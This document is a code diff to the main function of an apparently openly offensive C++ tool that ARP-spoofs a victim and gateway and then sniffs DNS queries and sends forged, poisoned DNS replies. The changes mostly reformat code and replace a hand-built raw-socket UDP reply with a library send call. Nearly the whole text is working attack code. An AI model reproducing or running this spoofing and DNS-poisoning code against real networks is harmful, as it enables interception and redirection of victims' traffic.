@@ -19,11 +19,12 @@ int main(int argc, const char *argv[]) {
     const char *interfaceName = "eno1";                           // get this from config file
     std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file
 
-    unsigned char attackerMac[ETH_ALEN] = {0xe4, 0xb9, 0x7a, 0xee, 0x8d, 0xa5}; // get this from config file
-    unsigned char victimMac[ETH_ALEN];   // get this from arp request
-    unsigned char gatewayMac[ETH_ALEN];  // get this from arp request
-    struct in_addr victimIp;             // get this from config file
-    struct in_addr gatewayIp;            // get this from config file
+    unsigned char attackerMac[ETH_ALEN] = {0xe4, 0xb9, 0x7a,
+                                           0xee, 0x8d, 0xa5}; // get this from config file
+    unsigned char victimMac[ETH_ALEN];                        // get this from arp request
+    unsigned char gatewayMac[ETH_ALEN];                       // get this from arp request
+    struct in_addr victimIp;                                  // get this from config file
+    struct in_addr gatewayIp;                                 // get this from config file
 
     struct arp_header victimArp;
     struct arp_header gatewayArp;
@@ -59,7 +60,7 @@ int main(int argc, const char *argv[]) {
                     }
                     victimMacSet = true;
                     std::cout << "victim mac acquired" << std::endl;
-                } else if(tmp->s_addr == gatewayIp.s_addr) {
+                } else if (tmp->s_addr == gatewayIp.s_addr) {
                     for (int i = 0; i < ETH_ALEN; i++) {
                         gatewayMac[i] = arp->arp_sha[i];
                     }
@@ -103,77 +104,42 @@ int main(int argc, const char *argv[]) {
 
     // start dns sniffing
     ipEngine.LoopCallbacks.clear();
-    ipEngine.LoopCallbacks.push_back(
-        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
-            unsigned char buffer[1500];
-            struct iphdr *ip;
-            struct udphdr *udp;
-            dnshdr *dns;
+    ipEngine.LoopCallbacks.push_back([&](const struct pcap_pkthdr *header,
+                                         const unsigned char *packet) {
+        UCharVector buffer(1500, 0);
+        struct iphdr *ip;
+        struct udphdr *udp;
+        dnshdr *dns;
 
-            int ipLen = 0;
-            int udpLen = 0;
-            int dnsLen = 0;
+        int ipLen = 0;
+        int udpLen = 0;
+        int dnsLen = 0;
 
-            // get ip hdr size
-            ip = (iphdr *)(packet + 14);
-            ipLen = ip->ihl * 4;
+        // get ip hdr size
+        ip = (iphdr *)(packet + 14);
+        ipLen = ip->ihl * 4;
 
-            // get udp hdr and size
-            udp = (udphdr *)(packet + 14 + ipLen);
-            udpLen = UdpStack::UDP_HDR_LEN;
+        // get udp hdr and size
+        udp = (udphdr *)(packet + 14 + ipLen);
+        udpLen = UdpStack::UDP_HDR_LEN;
 
-            // get dns header
-            dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
+        // get dns header
+        dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
 
-            std::cout << "dns packet received" << std::endl;
+        std::cout << "dns packet received" << std::endl;
 
-            // craft the poisoned response
-            int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
+        // craft the poisoned response
+        int responseSize = forgeDns(dns, &spoofIp, buffer.data());
 
-            // reply
-            struct iphdr *ipBuffer = (struct iphdr *)buffer;
-            struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
+        struct in_addr originalSrc;
+        struct in_addr originalDst;
 
-            ipBuffer->ihl = 5;
-            ipBuffer->version = 4;
-            ipBuffer->tos = 0;
-            ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
-            ipBuffer->frag_off = 0;
-            ipBuffer->ttl = 64;
-            ipBuffer->protocol = IPPROTO_UDP;
-            ipBuffer->check = 0;
-            ipBuffer->saddr = ip->daddr;
-            ipBuffer->daddr = ip->saddr;
-            ipBuffer->check = in_cksum((unsigned short *)ipBuffer, ipBuffer->ihl * 4);
+        originalSrc.s_addr = ip->saddr;
+        originalDst.s_addr = ip->daddr;
 
-            udpBuffer->source = udp->dest;
-            udpBuffer->dest = udp->source;
-            udpBuffer->len = htons(UdpStack::UDP_HDR_LEN + responseSize);
-
-            struct UdpPseudoHeader pseudo_header;
-            pseudo_header.srcAddr = ip->daddr;
-            pseudo_header.dstAddr = ip->saddr;
-            pseudo_header.placeholder = 0;
-            pseudo_header.protocol = IPPROTO_UDP;
-            pseudo_header.udpLen = udpBuffer->len;
-            memcpy((char *)&pseudo_header.udp, (char *)&udpBuffer, ntohs(udpBuffer->len));
-            udpBuffer->check =
-                in_cksum((unsigned short *)&pseudo_header, sizeof(struct UdpPseudoHeader));
-
-            short totalLen = ipBuffer->ihl * 4 + UdpStack::UDP_HDR_LEN + responseSize;
-            ipBuffer->tot_len = htons(totalLen);
-
-            int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-
-            struct sockaddr_in sin;
-            sin.sin_family = AF_INET;
-            sin.sin_port = udpBuffer->source;
-            sin.sin_addr.s_addr = ipBuffer->daddr;
-
-            sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin, sizeof(sin));
-
-            close(rawSocket);
-        });
+        // reply
+        ipEngine.sendUdp(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
+    });
     std::cout << "starting dns sniff" << std::endl;
     ipEngine.startSniff("udp and dst port domain");
     std::cout << "dns sniffing started" << std::endl;
